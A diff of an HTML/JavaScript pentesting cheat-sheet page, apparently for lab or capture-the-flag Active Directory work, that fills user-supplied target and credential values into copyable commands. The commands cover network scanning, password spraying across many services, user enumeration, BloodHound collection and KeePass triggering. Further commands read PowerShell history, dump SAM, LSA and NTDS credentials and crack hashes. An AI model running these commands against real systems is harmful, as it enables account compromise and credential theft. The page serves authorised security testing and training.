@@ -3,218 +3,311 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>NXC · tryhackme style</title>
+  <title>Pentesting</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&family=JetBrains+Mono:wght@400;600&family=Orbitron:wght@600;800&display=swap" rel="stylesheet">
   <style>
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body {
-      background: #0a0e1a;
-      color: #c8d6e5;
-      font-family: 'Inter', sans-serif;
-      font-size: 14px;
-      line-height: 1.5;
-      padding: 16px;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-    }
-    .app {
-      max-width: 920px;
-      width: 100%;
-      background: rgba(14, 20, 40, 0.92);
-      border: 1px solid rgba(0, 240, 255, 0.08);
-      border-radius: 16px;
-      padding: 20px 24px 30px;
-      box-shadow: 0 8px 32px rgba(0,0,0,0.8), 0 0 60px rgba(0, 240, 255, 0.02);
-    }
-    ::-webkit-scrollbar { width: 4px; height: 4px; }
-    ::-webkit-scrollbar-track { background: #0d1422; border-radius: 12px; }
-    ::-webkit-scrollbar-thumb { background: #00f0ff; border-radius: 12px; box-shadow: 0 0 8px #00f0ff33; }
-
-    /* header – tryhackme style */
-    .header {
-      display: flex;
-      flex-wrap: wrap;
-      align-items: center;
-      justify-content: space-between;
-      padding-bottom: 14px;
-      border-bottom: 2px solid rgba(0, 240, 255, 0.06);
-      margin-bottom: 16px;
-    }
-    .title {
-      font-family: 'Orbitron', sans-serif;
-      font-weight: 800;
-      font-size: 1.6rem;
-      background: linear-gradient(135deg, #00e5ff, #7c4dff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-      letter-spacing: 1px;
-    }
-    .title small {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.6rem;
-      background: none;
-      -webkit-text-fill-color: #7c4dff;
-      opacity: 0.6;
-      margin-left: 6px;
-      letter-spacing: 0.5px;
-    }
-
-    /* vars – only TARGET, USER, PASS (no HASH, no DOMAIN) */
-    .vars {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 4px 16px;
-      padding: 6px 16px;
-      margin-bottom: 18px;
-      background: rgba(10, 14, 30, 0.5);
-      border: 1px solid rgba(0, 240, 255, 0.05);
-      border-radius: 12px;
-      align-items: center;
-    }
-    .var-item {
-      display: flex;
-      align-items: center;
-      gap: 4px;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.8rem;
-      color: #7c4dff;
-    }
-    .var-item label {
-      color: #5a7a9a;
-      font-family: 'Inter', sans-serif;
-      font-size: 0.6rem;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-    }
-    .var-item input {
-      background: rgba(10, 14, 30, 0.8);
-      border: 1px solid rgba(0, 240, 255, 0.12);
-      border-radius: 6px;
-      padding: 2px 10px;
-      color: #00f0ff;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.8rem;
-      width: 90px;
-      outline: none;
-      transition: 0.15s;
-    }
-    .var-item input:focus {
-      border-color: #7c4dff;
-      box-shadow: 0 0 12px rgba(124, 77, 255, 0.1);
-    }
-
-    .main { width: 100%; }
-    
-    .cmd-block {
-      background: rgba(10, 14, 30, 0.5);
-      border: 1px solid rgba(0, 240, 255, 0.04);
-      border-radius: 12px;
-      padding: 10px 16px;
-      margin-bottom: 8px;
-      transition: 0.15s;
-    }
-    .cmd-block:hover {
-      border-color: rgba(0, 240, 255, 0.12);
-      background: rgba(10, 14, 30, 0.7);
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-    }
-    .code {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 0.8rem;
-      color: #00f0ff;
-      word-break: break-all;
-    }
-    .code .hl { color: #7c4dff; font-weight: 600; }
-
-    @media (max-width: 600px) {
-      .var-item input { width: 60px; }
-      .title { font-size: 1.2rem; }
-      .app { padding: 14px 14px 20px; }
-    }
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{background:#0b0f1a;color:#c8d6e5;font-family:'Inter',sans-serif;font-size:14px;line-height:1.5;display:flex;justify-content:center;padding:12px;min-height:100vh;background:radial-gradient(circle at 20% 30%,#0e1424,#060a12)}
+    .app{max-width:1400px;width:100%;display:flex;gap:20px;background:rgba(8,12,24,.94);border:1px solid rgba(0,180,255,.08);border-radius:24px;padding:24px;box-shadow:0 12px 48px rgba(0,0,0,.9);min-height:80vh}
+    .sidebar{width:220px;min-width:220px;background:rgba(2,6,16,.5);border:1px solid rgba(0,180,255,.06);border-radius:16px;padding:18px 14px;display:flex;flex-direction:column;gap:12px;height:fit-content;position:sticky;top:12px}
+    .sidebar-title{font-family:'Orbitron',sans-serif;font-size:.65rem;text-transform:uppercase;letter-spacing:2px;color:#5f7a9a;padding-bottom:8px;border-bottom:1px solid rgba(0,180,255,.06);margin-bottom:4px;font-weight:600}
+    .sidebar-item{display:flex;align-items:center;gap:10px;padding:8px 12px;border-radius:10px;color:#8ab4d6;font-family:'JetBrains Mono',monospace;font-size:.7rem;cursor:pointer;border:1px solid transparent;transition:.15s}
+    .sidebar-item:hover{background:rgba(0,180,255,.06);border-color:rgba(0,180,255,.1);color:#b0e0ff}
+    .sidebar-item.active{background:rgba(0,180,255,.08);border-color:rgba(0,180,255,.15);color:#00b4ff}
+    .sidebar-item .label{flex:1}
+    .sidebar-divider{border:none;border-top:1px solid rgba(0,180,255,.06);margin:4px 0}
+    .content{flex:1;min-width:0}
+    .header{display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;padding-bottom:16px;border-bottom:1px solid rgba(0,180,255,.08);margin-bottom:20px}
+    .title{font-family:'Orbitron',sans-serif;font-weight:800;font-size:1.8rem;background:linear-gradient(145deg,#00b4ff,#5f7aff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;letter-spacing:1.5px}
+    .title small{font-family:'JetBrains Mono',monospace;font-size:.6rem;background:none;-webkit-text-fill-color:#5f7aff;opacity:.7;margin-left:8px;letter-spacing:.3px}
+    .vars{display:flex;flex-wrap:wrap;gap:6px 20px;padding:8px 20px;margin-bottom:22px;background:rgba(2,6,16,.6);border:1px solid rgba(0,180,255,.06);border-radius:16px;align-items:center}
+    .var-item{display:flex;align-items:center;gap:6px;font-family:'JetBrains Mono',monospace;font-size:.8rem;color:#7c9bff}
+    .var-item label{color:#5f7a9a;font-family:'Inter',sans-serif;font-size:.6rem;font-weight:700;text-transform:uppercase;letter-spacing:.8px;opacity:.7}
+    .var-item input{background:rgba(0,10,24,.9);border:1px solid rgba(0,180,255,.15);border-radius:8px;padding:4px 14px;color:#b0e0ff;font-family:'JetBrains Mono',monospace;font-size:.8rem;width:160px;outline:none}
+    .var-item input:focus{border-color:#5f7aff}
+    .main{width:100%}
+    .cmd-block{background:rgba(4,8,20,.5);border:1px solid rgba(0,180,255,.04);border-radius:14px;padding:12px 18px;margin-bottom:10px;box-shadow:0 1px 3px rgba(0,0,0,.3);cursor:pointer;transition:.15s;user-select:none}
+    .cmd-block:hover{border-color:rgba(0,180,255,.25);background:rgba(8,14,30,.7);box-shadow:0 1px 8px rgba(0,180,255,.05)}
+    .cmd-block:active{background:rgba(0,180,255,.1);border-color:#00b4ff;transform:scale(.998)}
+    .cmd-block.hidden{display:none}
+    .code{font-family:'JetBrains Mono',monospace;font-size:.8rem;color:#9acdff;word-break:break-all;pointer-events:none}
+    .code .hl{color:#a78bfa;font-weight:600}
+    ::-webkit-scrollbar{width:5px;height:5px}
+    ::-webkit-scrollbar-track{background:#0d1422;border-radius:16px}
+    ::-webkit-scrollbar-thumb{background:#00b4ff;border-radius:16px}
+    .doc-box{margin-top:20px;padding:16px 20px;background:rgba(2,6,16,.4);border:1px solid rgba(0,180,255,.06);border-radius:12px;font-size:.7rem;color:#5f7a9a;line-height:1.6}
+    .doc-box strong{color:#7c9bff}
+    .doc-box code{color:#7c9bff;background:rgba(0,10,24,.5);padding:2px 8px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:.7rem}
+    .doc-box .highlight{color:#00b4ff}
+    @media(max-width:860px){.app{flex-direction:column;padding:16px}.sidebar{width:100%;min-width:unset;position:relative;top:0;flex-direction:row;flex-wrap:wrap;padding:12px 14px;gap:6px}.sidebar-title{width:100%}.sidebar-item{padding:6px 12px;font-size:.65rem}.title{font-size:1.3rem}.doc-box{font-size:.6rem}}
+    @media(max-width:680px){.var-item input{width:70px}.app{padding:12px}.vars{padding:8px 12px;gap:4px 12px}}
   </style>
 </head>
 <body>
 <div class="app">
-  <!-- header -->
-  <header class="header">
-    <div class="title">NXC <small>tryhackme</small></div>
-  </header>
+  <!-- LEFT SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-title">mcb0b0</div>
 
-  <!-- variables: TARGET, USER, PASS (no HASH, no DOMAIN) -->
-  <div class="vars" id="vars">
-    <div class="var-item"><label>TARGET</label><input id="vTARGET" value="192.168.1.100" /></div>
-    <div class="var-item"><label>USER</label><input id="vUSER" value="Administrator" /></div>
-    <div class="var-item"><label>PASS</label><input id="vPASS" value="P@ssw0rd" /></div>
+    <div class="sidebar-item active" data-filter="nmap">
+      <span class="label">nmap</span>
+    </div>
+
+    <div class="sidebar-item active" data-filter="userenum">
+      <span class="label">userenum</span>
+    </div>
+    
+    <div class="sidebar-item active" data-filter="spray">
+      <span class="label">spray</span>
+    </div>
+    <div class="sidebar-item" data-filter="ldap">
+      <span class="label">ldap</span>
+    </div>
+    
+    <hr class="sidebar-divider">
+    
+    <div class="sidebar-item" data-filter="keepass">
+      <span class="label">keepass</span>
+    </div>
+    <div class="sidebar-item" data-filter="users">
+      <span class="label">users</span>
+    </div>
+    <div class="sidebar-item" data-filter="passpol">
+      <span class="label">passpol</span>
+    </div>
+    <div class="sidebar-item" data-filter="groups">
+      <span class="label">groups</span>
+    </div>
+    <div class="sidebar-item" data-filter="bloodhound">
+      <span class="label">bloodhound</span>
+    </div>
+    <div class="sidebar-item" data-filter="nxcdump">
+      <span class="label">nxcdump</span>
+    </div>
+
+  <!-- END LINES -->
+  </aside>
+
+  <!-- RIGHT CONTENT -->
+  <div class="content">
+    <!-- header -->
+    <header class="header">
+      <div class="title">Pentesting</div>
+    </header>
+
+    <!-- variables -->
+    <div class="vars" id="vars">
+      <div class="var-item"><label>TARGET</label><input id="vTARGET" value="ips" /></div>
+      <div class="var-item"><label>USER</label><input id="vUSER" value="bob" /></div>
+      <div class="var-item"><label>PASS</label><input id="vPASS" value="P@ssw0rd" /></div>
+      <div class="var-item"><label>DOMAIN</label><input id="vDOMAIN" value="domain.local" placeholder="domain.local" /></div>
+    </div>
+
+    <!-- main commands -->
+    <main class="main" id="main"></main>
   </div>
-
-  <!-- main content – only commands, no headers -->
-  <main class="main" id="main"></main>
 </div>
 
 <script>
   (function(){
-    const CMD = [
-      'powershell -c type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
-      'nxc smb {TARGET} -u {USER} -p {PASS} -M powershell_history',
-      'nxc smb {TARGET} -u {USER} -p {PASS} -M keepass_discover',
-      'nxc smb {TARGET} -u {USER} -p {PASS} -M keepass_trigger -o ACTION=ALL',
-      'nxc smb {TARGET} -u {USER} -p {PASS} --loggedon-users',
-      'nxc smb {TARGET} -u {USER} -p {PASS} --sessions',
-      'nxc smb {TARGET} -u {USER} -p {PASS} --local-groups',
-      'nxc smb {TARGET} -u {USER} -p {PASS} --shares',
-      'nxc smb {TARGET} -u {USER} -p {PASS} --pass-pol',
-      'nxc smb {TARGET} -u {USER} -p {PASS} --users',
-      'nxc smb {TARGET} -u {USER} -p {PASS} --groups',
-      'nxc ldap {TARGET} -u {USER} -p {PASS} --users',
-      'nxc ldap {TARGET} -u {USER} -p {PASS} --groups',
-      'nxc ldap {TARGET} -u {USER} -p {PASS} --password-not-required',
-      'nxc ldap {TARGET} -u {USER} -p {PASS} --admin-count',
-      'nxc ldap {TARGET} -u {USER} -p {PASS} -M get-desc-users',
-      'nxc ldap {TARGET} -u {USER} -p {PASS} -M get-info-users',
-      'nxc ldap {TARGET} -u {USER} -p {PASS} -M get-unixUserPassword',
-      'nxc ldap {TARGET} -u {USER} -p {PASS} -M get-userPassword',
-      'nxc ldap {TARGET} -u {USER} -p {PASS} -M laps',
-      'nxc ldap {TARGET} -u {USER} -p {PASS} -M user-desc -o KEYWORDS=pwd,admin',
-      'nxc ldap {TARGET} -u {USER} -p {PASS} -M maq',
-      'nxc ldap {TARGET} -u {USER} -p {PASS} -M pre2k'
+    const CMD_DATA = [
+      // ===== NMAP MODULE =====
+      { cmd: 'nmap -p- -Pn $(cat {TARGET}) -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt', category: 'nmap' },
+      { cmd: 'nmap -Pn $(cat {TARGET}) -sV -sC -v -oN nmap_sVsC.txt', category: 'nmap' },
+      { cmd: 'nmap -T4 -Pn $(cat {TARGET}) -v --script vuln -oN nmap_vuln.txt ', category: 'nmap' },
+
+
+      // ===== SMB MODULE =====
+      { cmd: 'powershell -c type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt', category: 'spray' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -M powershell_history', category: 'spray' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} ', category: 'spray' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} --local-auth ', category: 'spray' },
+      { cmd: 'nxc smb {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
+      { cmd: 'nxc smb {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
+      { cmd: 'nxc winrm {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
+      { cmd: 'nxc winrm {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
+      { cmd: 'nxc rdp {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
+      { cmd: 'nxc rdp {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
+      { cmd: 'nxc mssql {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
+      { cmd: 'nxc mssql {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
+      { cmd: 'nxc ldap {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
+      { cmd: 'nxc ldap {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
+      { cmd: 'nxc wmi {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
+      { cmd: 'nxc wmi {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
+      { cmd: 'nxc ftp {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
+      { cmd: 'nxc ftp {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
+      { cmd: 'nxc ssh {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
+      { cmd: 'nxc ssh {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
+      { cmd: 'nxc nfs {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
+      { cmd: 'nxc nfs {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
+      { cmd: 'nxc vnc {TARGET} -u users.txt -p {PASS} --continue-on-success', category: 'spray' },
+      { cmd: 'nxc vnc {TARGET} -u users.txt -p {PASS} --local-auth --continue-on-success', category: 'spray' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --local-groups', category: 'spray' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --shares', category: 'spray' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --groups', category: 'spray' },
+      
+      // ===== LDAP MODULE =====
+      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --password-not-required', category: 'ldap' },
+      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --admin-count', category: 'ldap' },
+      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M get-unixUserPassword', category: 'ldap' },
+      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M get-userPassword', category: 'ldap' },
+      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M laps', category: 'ldap' },
+      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M maq', category: 'ldap' },
+      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M pre2k', category: 'ldap' },
+      
+      // ===== KEEPASS MODULE =====
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M keepass_discover', category: 'keepass' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M keepass_trigger -o ACTION=ALL', category: 'keepass' },
+      
+      // ===== USERS MODULE =====
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --loggedon-users', category: 'users' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --sessions', category: 'users' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --users', category: 'users' },
+      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --users', category: 'users' },
+      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M get-desc-users', category: 'users' },
+      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M get-info-users', category: 'users' },
+      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} -M user-desc -o KEYWORDS=pwd,admin', category: 'users' },
+      
+      // ===== PASS-POL MODULE =====
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --pass-pol', category: 'passpol' },
+      
+      // ===== GROUPS MODULE =====
+      { cmd: 'nxc ldap {TARGET} -u {USER} -p {PASS} -d {DOMAIN} --groups', category: 'groups' },
+
+      // ===== bloodhound MODULE =====
+      { cmd: 'nxc ldap $(cat dcip) -u {USER} -p {PASS} --bloodhound -c All --dns-server $(cat dcip) ', category: 'bloodhound' },
+      { cmd: 'nxc ldap $(cat dcip) -u {USER} -p {PASS} --bloodhound -c All --dns-server $(cat dcip) --dns-tcp', category: 'bloodhound' },
+      { cmd: 'bloodhound-python -d {DOMAIN} -u {USER} -p {PASS} -c All --zip -ns $(cat dcip)', category: 'bloodhound' },
+      { cmd: 'bloodyad -d {DOMAIN} --host dc01.{DOMAIN} -i $(cat dcip) -u {USER} -p {PASS} get bloodhound', category: 'bloodhound' },
+      { cmd: 'rusthound-ce -u {USER} -p {PASS} --domain {DOMAIN} -i $(cat dcip) --zip', category: 'bloodhound' },
+      { cmd: 'rusthound-ce -u {USER} -p {PASS} --domain {DOMAIN} -i $(cat dcip) --ldaps --zip', category: 'bloodhound' },
+      { cmd: '.\\SharpHound.exe -c All', category: 'bloodhound' },
+
+      // ===== userenum MODULE =====
+      { cmd: 'nxc smb $(cat dcip) -u {USER} -p {PASS} --users-export users.txt', category: 'userenum' },
+      { cmd: 'nxc smb $(cat dcip) -u {USER} -p {PASS} --users-export users.txt -k', category: 'userenum' },
+      { cmd: `nxc smb $(cat dcip) -u guest -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\\' -f2 | tee users.txt`, category: 'userenum'},
+      { cmd: `impacket-lookupsid -no-pass 'guest@{DOMAIN}' 8000 | grep SidTypeUser | cut -d' ' -f2 | cut -d '\\' -f2 | tee users.txt`, category: 'userenum' },
+      { cmd: `impacket-GetADUsers -all {DOMAIN}/{USER}:'{PASS}' -dc-ip $(cat dcip)`, category: 'userenum' },
+      { cmd: 'kerbrute userenum -d {DOMAIN} --dc $(cat dcip) /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt', category: 'userenum' },
+      { cmd: 'ldapsearch -h $(cat dcip) -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "', category: 'userenum' },
+      { cmd: 'windapsearch.py --dc-ip $(cat dcip) -u "" -U', category: 'userenum' },
+      { cmd: 'enum4linux -U $(cat dcip) | grep "user:" | cut -f2 -d"[" | cut -f1 -d "]" > users.txt', category: 'userenum' },
+      { cmd: 'nxc ldap $(cat dcip) -u {USER} -p {PASS} --query "(sAMAccountName=*)" ""', category: 'userenum' },
+      { cmd: '.\\SharpHound.exe -c All', category: 'userenum' },
+
+
+      // ===== nxcdump MODULE =====
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} --sam', category: 'nxcdump' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} --ldaps', category: 'nxcdump' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} --lsa ', category: 'nxcdump' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -M lsassy', category: 'nxcdump' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} --ntds', category: 'nxcdump' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -M nanodump', category: 'nxcdump' },
+      { cmd: 'nxc smb {TARGET} -u {USER} -p {PASS} -M procdump', category: 'nxcdump' },
+      { cmd: `nxc smb {TARGET} -u {USER} -p {PASS} --lsa | awk '{print $5}' | fgrep '/' | tee hashes.txt`, category: 'nxcdump' },
+      { cmd: `john --wordlist=/usr/share/wordlists/rockyou.txt --format=mscash2 hashes.txt`, category: 'nxcdump' },
+      { cmd: `john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.txt`, category: 'nxcdump' },
+      { cmd: `hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt`, category: 'nxcdump' },
+      { cmd: `secretsdump.py {USER}:'{PASS}'@{TARGET}`, category: 'nxcdump' },
+      { cmd: `secretsdump.py {USER}@{TARGET} -hashes :30B3783CE2ABF1AF70F77D0660CF3453`, category: 'nxcdump' },
+      { cmd: `secretsdump.py '{DOMAIN}'/'{USER}':'{PASS}'@'{TARGET}'`, category: 'nxcdump' },
+      { cmd: `secretsdump.py {DOMAIN}/'{USER}'@{TARGET} -hashes :30B3783CE2ABF1AF70F77D0660CF3453`, category: 'nxcdump' },
+      { cmd: `haiti 30B3783CE2ABF1AF70F77D0660CF3453`, category: 'nxcdump' },
+      { cmd: `grep -a -P '[-_.,;:?!@#$%^&*()]' /usr/share/wordlists/rockyou.txt > rockyou_symbols.txt`, category: 'nxcdump' },
+      { cmd: `grep -P '^[a-zA-Z0-9]+$' /usr/share/wordlists/rockyou.txt > rockyou_alphanumeric.txt`, category: 'nxcdump' },
+
+      // ===== END LINES =====
     ];
 
     const $ = id => document.getElementById(id);
     const v = { 
-      TARGET: $('vTARGET'), USER: $('vUSER'), PASS: $('vPASS'),
-      DC: $('vTARGET')
+      TARGET: $('vTARGET'), 
+      USER: $('vUSER'), 
+      PASS: $('vPASS'),
+      DOMAIN: $('vDOMAIN')
     };
     const main = $('main');
+    let currentFilter = 'nmap';
 
     function getVars() {
+      const domain = v.DOMAIN.value.trim();
       return { 
-        TARGET: v.TARGET.value, USER: v.USER.value, PASS: v.PASS.value,
-        DC: v.TARGET.value,
-        LHOST: '10.10.10.5', LPORT: '4444', SHARE: 'ADMIN$', DOMAIN: 'CONTOSO', HASH: 'aad3b435b51404eeaad3b435b51404ee'
+        TARGET: v.TARGET.value.trim(), 
+        USER: v.USER.value.trim(), 
+        PASS: v.PASS.value.trim(),
+        DOMAIN: domain || ''
       };
     }
     function interp(cmd) {
       const vars = getVars();
-      return cmd.replace(/{(\w+)}/g, (_, k) => vars[k] || `{${k}}`);
+      let result = cmd.replace(/{(\w+)}/g, (_, k) => vars[k] || `{${k}}`);
+      // Clean up empty domain flag if domain is empty
+      if (!vars.DOMAIN) {
+        result = result.replace(/\s+-d\s*\{\w+\}/g, '');
+        result = result.replace(/\s+-d\s*''/g, '');
+        result = result.replace(/\s+-d\s*""/g, '');
+      }
+      return result;
+    }
+
+    function copyToClipboard(text) {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).catch(() => fallbackCopy(text));
+      } else {
+        fallbackCopy(text);
+      }
+    }
+
+    function fallbackCopy(text) {
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.cssText = 'position:fixed;opacity:0;left:-9999px;top:-9999px';
+      document.body.appendChild(ta);
+      ta.select();
+      try { document.execCommand('copy'); } catch(e) {}
+      document.body.removeChild(ta);
+    }
+
+    function filterCommands(filter) {
+      currentFilter = filter;
+      const blocks = document.querySelectorAll('.cmd-block');
+      
+      blocks.forEach((block, index) => {
+        const cmdData = CMD_DATA[index];
+        if (!cmdData) return;
+        block.classList.toggle('hidden', cmdData.category !== filter);
+      });
+      
+      document.querySelectorAll('.sidebar-item').forEach(item => {
+        item.classList.toggle('active', item.dataset.filter === filter);
+      });
     }
 
     function render() {
       let html = '';
-      CMD.forEach(cmd => {
-        const cmdText = interp(cmd);
-        html += `
-          <div class="cmd-block">
-            <div class="code">${cmdText}</div>
-          </div>
-        `;
+      CMD_DATA.forEach((cmdData, index) => {
+        html += `<div class="cmd-block" data-category="${cmdData.category}" data-index="${index}">
+          <div class="code">${interp(cmdData.cmd)}</div>
+        </div>`;
       });
       main.innerHTML = html;
+      filterCommands(currentFilter);
+      
+      document.querySelectorAll('.cmd-block').forEach(block => {
+        block.addEventListener('click', function() {
+          copyToClipboard(this.querySelector('.code').textContent);
+        });
+      });
     }
+
+    document.querySelectorAll('.sidebar-item[data-filter]').forEach(item => {
+      item.addEventListener('click', function() {
+        filterCommands(this.dataset.filter);
+      });
+    });
 
     document.querySelectorAll('.var-item input').forEach(inp => inp.addEventListener('input', render));
 
